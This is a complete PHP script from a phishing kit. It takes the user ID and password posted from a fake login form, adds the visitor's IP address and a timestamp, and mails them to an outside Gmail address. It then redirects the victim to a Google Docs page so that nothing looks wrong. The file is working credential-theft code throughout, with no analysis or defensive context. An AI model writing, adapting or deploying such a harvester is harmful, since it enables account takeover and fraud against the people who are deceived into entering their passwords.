<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------      UserID      ------------------------------\n";
$message .= "UserID: ".$_POST['otheruser']."\n";
$message .= "Password: ".$_POST['otherpassword']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------------\n";

$recipient = "jamesphilip102@gmail.com";
$subject = "Other Email - Created By Nastie";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://docs.google.com/document/d/1KGFousLFJ9f_7Awu2oQyfMGsKPdSwLxrecZghT7rbvE/edit?pli=1");

	   }


?>